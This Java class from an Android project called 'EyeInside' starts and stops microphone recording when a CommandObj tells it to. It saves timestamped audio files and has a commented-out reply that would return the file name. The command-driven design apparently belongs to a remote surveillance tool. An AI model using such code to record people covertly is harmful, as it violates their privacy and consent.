package com.code4bones.EyeInside;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

import com.code4bones.utils.NetLog;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;

public class VoiceRecorder extends Object {

	final MediaRecorder recorder;
	public static VoiceRecorder instance = null;
	public Context mContext;
	public int recordTime;
	public CommandObj command;
	public String fileName;
	public PendingIntent pendingIntent = null;
	
	public static VoiceRecorder getInstance(Context context,CommandObj cmd,int recordTimeSec) {
		if ( VoiceRecorder.instance == null ) {
			VoiceRecorder.instance = new VoiceRecorder(context,cmd,recordTimeSec);
		}
		return VoiceRecorder.instance;
	}
	
	public static VoiceRecorder getInstance(Context context,CommandObj cmd) {
		if ( VoiceRecorder.instance == null ) {
			VoiceRecorder.instance = new VoiceRecorder(context,cmd);
		}
		return VoiceRecorder.instance;
	}

	
	public VoiceRecorder(Context context,CommandObj cmd) {
		this.mContext = context;
		this.command = cmd;
		this.recordTime = -1;
		this.recorder = new MediaRecorder();
	}
	
	public VoiceRecorder(Context context,CommandObj cmd,int recordTimeSec) {
		this.mContext = context;
		this.command = cmd;
		this.recordTime = recordTimeSec;
		this.recorder = new MediaRecorder();
	}

	public void start() throws Exception {
		
		Date now = new Date();
		SimpleDateFormat df = new SimpleDateFormat("yyMMdd_hhmmss");
		fileName = CommandObj.getFile(mContext,"REC_"+df.format(now),false);
		
		
		NetLog.v("Recording to %s\r\n",fileName);
		
		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
	    recorder.setAudioChannels(1);
	    

	    if ( Build.VERSION.SDK_INT >= 10 ) {
		    recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
		    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
		    recorder.setAudioSamplingRate(44100);
		    recorder.setAudioEncodingBitRate(96000);
		    fileName += ".mp4";
	    } else {
		    recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
		    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
		    recorder.setAudioSamplingRate(44100);
		    recorder.setAudioEncodingBitRate(16);
		    fileName += ".3gp";
	    }
	    recorder.setOutputFile(fileName);
	    recorder.prepare();
	    recorder.start();				
	    
	    if ( this.recordTime > 0 ) {
				AlarmManager alarm = (AlarmManager)mContext.getSystemService(Context.ALARM_SERVICE);
				Intent intent = new Intent(mContext,Event_BroadcastReceiver.class);
				intent.setAction(command.mCommandName);
				pendingIntent = PendingIntent.getBroadcast(mContext,0, intent, PendingIntent.FLAG_CANCEL_CURRENT);
				Calendar calendar = Calendar.getInstance();
				calendar.add(Calendar.SECOND, this.recordTime);
				alarm.set(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), pendingIntent);
	    }
	}
	
	public void stop() throws Exception {
		
		if ( this.pendingIntent != null ) {
			AlarmManager alarm = (AlarmManager)mContext.getSystemService(Context.ALARM_SERVICE);
			alarm.cancel(pendingIntent);
		}
		this.pendingIntent = null;
		recorder.stop();
		recorder.reset();
		recorder.release();
		NetLog.v("Recording stopped");
		//command.Reply(fileName);
	}
	
}
